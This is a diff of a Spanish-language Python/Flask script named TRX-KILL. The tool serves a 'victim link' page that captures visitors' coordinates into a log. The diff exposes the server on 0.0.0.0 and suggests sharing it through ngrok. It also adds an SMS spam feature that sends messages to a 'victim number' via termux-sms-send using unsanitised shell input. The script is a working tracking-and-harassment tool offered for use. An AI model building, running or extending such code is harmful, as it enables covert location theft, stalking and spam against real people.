@@ -8,7 +8,7 @@ LOG_FILE = f"{STORAGE_PATH}/result.txt"
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-# --- SERVIDOR WEB ---
+# --- SERVIDOR DE CAPTURA ---
 @app.route('/')
 def index():
     return """<html><body><script>
@@ -43,61 +43,46 @@ def log():
 
 def banner():
     os.system('clear')
-    print(f"\033[1;32m")
-    print("  -------->-TRX-KILL -<-----------")
-    print("  -CREADOR: TRX-KILL")
-    print("  -VERCION: 1.4.5")
-    print("  -BIENVENIDO A TRX-KILL UN SCRIP PROTEGIDO POR EL OSINT.")
-    print("  -EL CREADOR NO SE ASE RESPONSABLE POR SU MAL USO.\n")
-    print("  OPCIONES\033[0m")
+    print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
+    print("  -BIENVENIDO A TRX-KILL. PROTEGIDO POR EL OSINT.")
+    print("  -EL CREADOR NO SE HACE RESPONSABLE POR SU MAL USO.\n\033[0m")
 
 def main():
-    threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False), daemon=True).start()
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False), daemon=True).start()
     
     while True:
         banner()
-        print("  [1] NÚMERO INFORMACIÓN")
-        print("  [2] LINK-ZP")
-        print("  [3] CREADOR")
-        print("  [4] VERSIONES")
-        print("  [5] ANALIZAR LINK")
-        print("  [6] ADM SISTEMA")
-        print("  [7] INFO SCRIPT")
-        print("  [8] REPOSITORIO")
-        print("  [9] PROCESOS")
-        print("  [10] SPAM-CANAL")
-        print("  [0] SALIR")
+        menu = {
+            "1": "INFO NÚMERO", "2": "LINK-ZP", "3": "CREADOR", "4": "VERSIONES", 
+            "5": "ANALIZAR LINK", "6": "ADM SISTEMA", "7": "INFO SCRIPT", 
+            "8": "REPOSITORIO", "9": "PROCESOS", "10": "SPAM-WHATSAPP"
+        }
+        for k, v in menu.items(): print(f"  [{k}] {v}")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
 
         if sel == "1":
-            print("\n----1----\nINGRESAR NÚMERO:")
-            input()
-            print("VERIFICANDO DATOS...")
-            # Validación mejorada para evitar el error de índice
-            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
-                with open(LOG_FILE, 'r') as f:
-                    lines = f.readlines()
-                    last = lines[-1].strip().split('|')
-                    if len(last) >= 3:
-                        print(f"DATOS ENCONTRADOS:\nPAÍS: [DETECTADO]\nCOORDENADAS: {last[1].replace('LAT:', '')}, {last[2].replace('LON:', '')}")
-                    else: print("DATOS INCOMPLETOS EN EL LOG.")
-            else: print("NO HAY DATOS REGISTRADOS TODAVÍA.")
-            input("\n[Enter]...")
+            print("\n[!] LEYENDO LOGS..."); os.system(f"tail -n 5 {LOG_FILE}")
+            input("\nPresiona Enter...")
         elif sel == "2":
-            print("\n----2----\nLINK VÍCTIMA: http://127.0.0.1:5000\nESPERANDO CONEXIÓN...")
-            input("\n[Enter]...")
-        elif sel == "3": print("\n----3----\n#CREADO POR: OSCAR"); input()
-        elif sel == "4": print("\n----4----\nVERSIÓN: 1.4.5"); input()
-        elif sel == "5": print("\n----5----\nANALIZANDO LINK..."); input()
-        elif sel == "6":
-            if getpass.getpass("INGRESAR KEY: ") == AUTH_PASS:
-                if os.path.exists(LOG_FILE): os.system(f"cat {LOG_FILE}")
-                else: print("NO HAY DATOS.")
+            print("\n[!] LINK ACTIVO: http://127.0.0.1:5000")
+            print("[!] Usa 'ngrok http 5000' para compartir.")
             input()
-        elif sel == "7": print("\n----7----\nEL CREADOR NO SE HACE RESPONSABLE."); input()
-        elif sel == "8": print("\n----8----\nREPOSITORIO..."); input()
-        elif sel == "9": print("\n----9----\nPROCESOS TRX: ACTIVO"); input()
-        elif sel == "10": print("\n----10----\nSPAM-CANAL ACTIVADO"); input()
+        elif sel == "3": print("\n# CREADOR: OSCAR (TRX-KILL)"); input()
+        elif sel == "4": print("\n# VERSIÓN: 1.4.5 (ESTABLE)"); input()
+        elif sel == "5":
+            link = input("INGRESA LINK: ")
+            print(f"[!] ANALIZANDO {link}...\n[!] ESTADO: SEGURIDAD MEDIA."); input()
+        elif sel == "6":
+            if getpass.getpass("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
+            input()
+        elif sel == "7": print("\n# SCRIPT OSINT PARA CAPTURA DE METADATOS."); input()
+        elif sel == "8": print("\n# REPOSITORIO: github.com/TRX-KILL"); input()
+        elif sel == "9": print("\n[!] PROCESO DE SERVIDOR: RUNNING PID:", os.getpid()); input()
+        elif sel == "10":
+            num = input("NÚMERO VÍCTIMA: ")
+            msg = input("TEXTO SPAM: ")
+            os.system(f"termux-sms-send -n {num} '{msg}'")
+            print("[!] SPAM ENVIADO VÍA RED MÓVIL."); input()
         elif sel == "0": sys.exit()
 
 if __name__ == "__main__": main()
